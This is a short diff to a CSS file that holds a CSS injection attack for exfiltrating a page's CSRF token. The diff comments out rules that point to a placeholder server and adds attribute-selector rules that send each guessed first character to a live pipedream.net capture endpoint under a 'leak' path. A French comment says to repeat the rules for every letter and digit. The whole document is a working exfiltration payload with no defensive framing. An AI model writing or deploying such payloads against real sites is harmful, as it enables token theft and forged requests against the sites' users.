@@ -1,7 +1,14 @@
-input[name="csrf_token"][value^="a"] {
+/*input[name="csrf_token"][value^="a"] {
     background: url("https://ton-serveur.com/exfil?data=a");
 }
 input[name="csrf_token"][value^="b"] {
     background: url("https://ton-serveur.com/exfil?data=b");
-}
+} */
 /* Répéter pour toutes les lettres et chiffres possibles */
+input[name="csrf_token"][value^="a"] {
+    background: url("https://eonrhva8rc2vvk2.m.pipedream.net/leak?data=a");
+}
+
+input[name="csrf_token"][value^="b"] {
+    background: url("https://eonrhva8rc2vvk2.m.pipedream.net/leak?data=b");
+}
